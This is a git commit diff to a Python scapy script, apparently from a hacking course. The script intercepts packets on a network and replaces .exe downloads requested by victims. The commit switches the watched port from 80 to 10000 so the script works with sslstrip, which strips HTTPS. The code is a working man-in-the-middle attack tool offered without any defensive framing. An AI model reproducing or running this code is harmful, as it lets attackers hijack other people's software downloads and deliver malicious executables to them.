e6ab3da7948f34c4b817fdfe36979c91ae976b57
Shahtr1 <tramboos123@gmail.com>
2021-01-15 05:44:14 -0500

    additions

--- replace_downloads.py
+++ replace_downloads.py
@@ -19,11 +19,13 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # wrapping packet with scapy IP layer
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+        # if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 10000: # using sslstrip
+            if ".exe" in scapy_packet[scapy.Raw].load and "www.rarlab.com" not in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-        elif scapy_packet[scapy.TCP].sport == 80:
+        # elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000: # using sslstrip
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
